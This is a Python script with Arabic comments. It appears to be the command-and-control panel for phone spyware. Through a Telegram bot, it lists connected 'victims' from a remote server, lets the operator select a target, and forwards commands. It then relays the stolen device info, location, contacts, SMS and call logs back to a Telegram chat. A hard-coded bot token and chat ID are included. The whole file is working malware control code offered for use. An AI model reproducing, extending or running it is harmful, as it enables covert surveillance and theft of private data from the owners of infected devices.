import requests
import time
import json
import threading

# ===== ✅ البوت المطلوب =====
TOKEN = "8161789676:AAEZIz_8ilIZUPpG7lvj37UnEt1WHInZkKA"
CHAT_ID = "7810572372"
SERVER_URL = "https://tradebot-hacker.onrender.com"

# ===== متغيرات =====
last_update_id = 0
victims = {}
current_target = None
paused = []

# ===== ✅ دالة إرسال رسالة =====
def send_message(text):
    try:
        # ✅ تنظيف النص من Markdown
        text = text.replace('*', '').replace('_', '').replace('`', '').replace('[', '').replace(']', '')
        
        # ✅ تقييد طول النص
        if len(text) > 4000:
            text = text[:4000] + "\n\n... (مقتطع)"

        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": text
        }
        
        response = requests.post(url, data=data, timeout=30)
        
        if response.status_code == 200:
            print("✅ Message sent!")
            return True
        else:
            print(f"❌ Send failed: {response.status_code}")
            print(f"   Response: {response.text[:200]}")
            return False
            
    except Exception as e:
        print(f"❌ Send error: {e}")
        return False

# ===== ✅ دالة جلب الأجهزة =====
def fetch_registered_devices():
    try:
        url = f"{SERVER_URL}/devices"
        resp = requests.get(url, timeout=30)
        if resp.status_code == 200:
            data = resp.json()
            devices = data.get("devices", {})
            for device_id, device_name in devices.items():
                if device_id not in victims:
                    victims[device_id] = device_name
                    print(f"✅ Device discovered: {device_name} ({device_id})")
                    send_message(f"New Device: {device_name} (ID: {device_id})")
            return True
    except Exception as e:
        print(f"❌ Fetch devices error: {e}")
    return False

# ===== ✅ دالة إرسال أمر =====
def send_command_to_device(device_id, command):
    try:
        url = f"{SERVER_URL}/send_command"
        payload = {"target": device_id, "command": command}
        resp = requests.post(url, json=payload, timeout=30)
        if resp.status_code == 200:
            print(f"📤 Command sent: {command} -> {device_id}")
            return True
        else:
            print(f"❌ Send command failed: {resp.status_code}")
            return False
    except Exception as e:
        print(f"❌ Send command error: {e}")
        return False

# ===== ✅ دالة جلب النتائج =====
def fetch_results(device_id):
    try:
        url = f"{SERVER_URL}/get_results/{device_id}"
        resp = requests.get(url, timeout=30)
        if resp.status_code == 200:
            data = resp.json()
            result = data.get("result")
            if result:
                return result
    except Exception as e:
        print(f"❌ Fetch results error: {e}")
    return None

# ===== ✅ حلقة الاستماع للنتائج =====
def listen_for_updates():
    while True:
        try:
            fetch_registered_devices()
            for device_id in list(victims.keys()):
                result = fetch_results(device_id)
                if result:
                    device_name = victims.get(device_id, "Unknown")
                    if len(result) > 3000:
                        parts = [result[i:i+3000] for i in range(0, len(result), 3000)]
                        for i, part in enumerate(parts):
                            send_message(f"Result from {device_name} (Part {i+1}/{len(parts)}):\n{part}")
                    else:
                        send_message(f"Result from {device_name}:\n{result}")
        except Exception as e:
            print(f"❌ Listen error: {e}")
        time.sleep(3)

# ===== ✅ استقبال التحديثات من Telegram =====
def get_updates(offset):
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    try:
        resp = requests.get(url, params={"offset": offset, "timeout": 30}, timeout=35)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("ok"):
                return data.get("result", [])
    except Exception as e:
        print(f"❌ Get updates error: {e}")
    return []

# ===== ✅ معالجة الأوامر =====
def handle_commands():
    global last_update_id, current_target, paused
    print("=" * 50)
    print("🚀 TradeBot Controller Started!")
    print("=" * 50)
    print(f"🤖 Bot: @esharattdawlbot")
    print(f"📱 Chat ID: {CHAT_ID}")
    print(f"🌐 Server: {SERVER_URL}")
    print("=" * 50)
    
    # ✅ إرسال رسالة بدء التشغيل
    send_message("✅ TradeBot Controller Started!")
    
    # ✅ جلب الأجهزة
    fetch_registered_devices()
    
    # ✅ بدء الاستماع للنتائج
    threading.Thread(target=listen_for_updates, daemon=True).start()
    
    print("✅ Ready! Send commands in Telegram.")
    print("=" * 50)
    
    while True:
        try:
            updates = get_updates(last_update_id + 1)
            for upd in updates:
                last_update_id = upd["update_id"]
                if "message" in upd:
                    text = upd["message"]["text"]
                    print(f"📩 Command: {text}")
                    
                    if text == "/start" or text == "/help":
                        send_message(
                            "TradeBot Controller\n"
                            "===================\n"
                            "/victims - List devices\n"
                            "/select <id> - Select target\n"
                            "/target - Current target\n"
                            "===================\n"
                            "Commands for target:\n"
                            "/device - Device info\n"
                            "/location - Location\n"
                            "/contacts - Contacts\n"
                            "/sms - SMS\n"
                            "/calls - Call log"
                        )
                    
                    elif text == "/victims":
                        if not victims:
                            send_message("No devices connected")
                        else:
                            msg = "Devices:\n========\n"
                            for k, v in victims.items():
                                stat = " (paused)" if k in paused else " (active)"
                                is_current = " <--" if k == current_target else ""
                                msg += f"{v}{stat}{is_current}\nID: {k}\n"
                            send_message(msg)
                    
                    elif text.startswith("/select"):
                        try:
                            target = text.split()[1]
                            if target in victims:
                                if target in paused:
                                    send_message(f"Device paused: {victims[target]}")
                                else:
                                    current_target = target
                                    send_message(f"Selected: {victims[target]}")
                            else:
                                send_message("Device not found")
                        except:
                            send_message("Usage: /select <device_id>")
                    
                    elif text == "/target":
                        if current_target and current_target in victims:
                            send_message(f"Target: {victims[current_target]}")
                        else:
                            send_message("No target selected")
                    
                    elif current_target:
                        if current_target in paused:
                            send_message("Device is paused!")
                        else:
                            if send_command_to_device(current_target, text):
                                send_message(f"Command sent: {text}")
                            else:
                                send_message("Failed to send command")
                    else:
                        send_message("Select target: /select <id>")
                    
            time.sleep(1)
        except Exception as e:
            print(f"❌ Main loop error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    handle_commands()
